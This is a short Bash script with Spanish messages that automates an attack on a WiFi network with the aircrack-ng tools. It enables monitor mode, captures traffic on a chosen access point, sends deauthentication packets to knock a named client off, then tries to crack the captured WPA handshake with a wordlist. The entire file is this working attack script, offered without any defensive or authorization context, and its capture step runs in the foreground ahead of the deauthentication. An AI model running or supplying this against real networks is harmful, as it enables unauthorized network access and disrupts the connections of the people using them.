#!/bin/bash

# Validar entrada
if [ $# -ne 5 ]; then
    echo "Uso: $0 <INTERFACE> <NETWORK_NAME> <BSSID> <CANAL> <CLIENTE>"
    exit 1
fi

INTERFACE=${1:-$INTERFACE}
NETWORK_NAME=${2:-$NETWORK_NAME}
BSSID=${3:-$BSSID}
CANAL=${4:-$CANAL}
CLIENTE=${5:-$CLIENTE}

# Verificar que las variables estén configuradas
if [ -z "$INTERFACE" ] || [ -z "$NETWORK_NAME" ] || [ -z "$BSSID" ] || [ -z "$CANAL" ] || [ -z "$CLIENTE" ]; then
    echo "Faltan argumentos o variables de entorno. Uso: $0 <INTERFACE> <NETWORK_NAME> <BSSID> <CANAL> <CLIENTE>"
    exit 1
fi

echo "Habilitando modo monitor en $INTERFACE..."
airmon-ng start $INTERFACE

echo "Escaneando la red $NETWORK_NAME..."
airodump-ng -c $CANAL --bssid $BSSID -w capture ${INTERFACE}mon

echo "Enviando paquetes de desautenticación al cliente $CLIENTE..."
aireplay-ng --deauth 10 -a $BSSID -c $CLIENTE ${INTERFACE}mon

echo "Intentando crackear la contraseña..."
aircrack-ng -w /tools/wordlist.txt capture-01.cap
